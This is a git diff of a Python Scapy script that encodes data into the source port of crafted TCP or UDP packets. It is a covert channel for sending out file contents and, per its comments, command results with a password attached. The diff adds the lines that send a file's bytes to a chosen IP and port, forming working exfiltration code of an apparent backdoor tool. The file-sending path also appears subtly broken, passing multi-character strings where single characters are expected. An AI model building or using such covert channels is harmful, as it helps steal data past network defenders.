@@ -10,7 +10,7 @@ def chunkString(size, string):
   return chunkedString
 
 # create a packet containing one character hidden in the source port
-def createPacket(protocol, ip, char):
+def createPacket(protocol, ip, char, port):
     # get the binary value of the character
     binChar = bin(ord(char))[2:].zfill(8)
     #print binChar
@@ -18,9 +18,9 @@ def createPacket(protocol, ip, char):
     intPortVal = int(binChar, 2)
     # craft the packet
     if protocol == 'tcp':
-        packet = IP(dst=ip)/TCP(dport=8000, sport=maxPort - intPortVal)
+        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
     elif protocol == 'udp':
-        packet = IP(dst=ip)/UDP(dport=8000, sport=maxPort - intPortVal)
+        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
     return packet
 
 # need comment
@@ -46,7 +46,7 @@ def parsePacket(packet):
         return str(char)
 
 # open a file in binary mode and return a string of the binary data
-def sendFile(ip, filePath):
+def sendFile(ip, filePath, protocol, port):
   try: # read the file byte by byte rather than reading the entire file into memory
     with open(filePath, 'rb') as fileDescriptor:
       while True:
@@ -56,14 +56,16 @@ def sendFile(ip, filePath):
         # we need the '1' + ... because python will trim the leading character if it's a zero
         byte = bin(int('1' + binascii.hexlify(bytes), 16))[3:].zfill(8)
         # send to IP address here
+        packet = createPacket(protocol, ip, byte, port)
+        send(packet, verbose=0)
   except IOError:
     print "file error"
 
 # we should pass the encrypted password + string (command results or something else)
-def sendMessage(message, password, protocol, ip):
+def sendMessage(message, password, protocol, ip, port):
   lastIndex = len(message) - 1
   for index, char in enumerate(message):
-    packet = createPacket(protocol, ip, char)
+    packet = createPacket(protocol, ip, char, port)
     if index ==  lastIndex:
       packet = packet/Raw(load=password)
     send(packet, verbose=0)
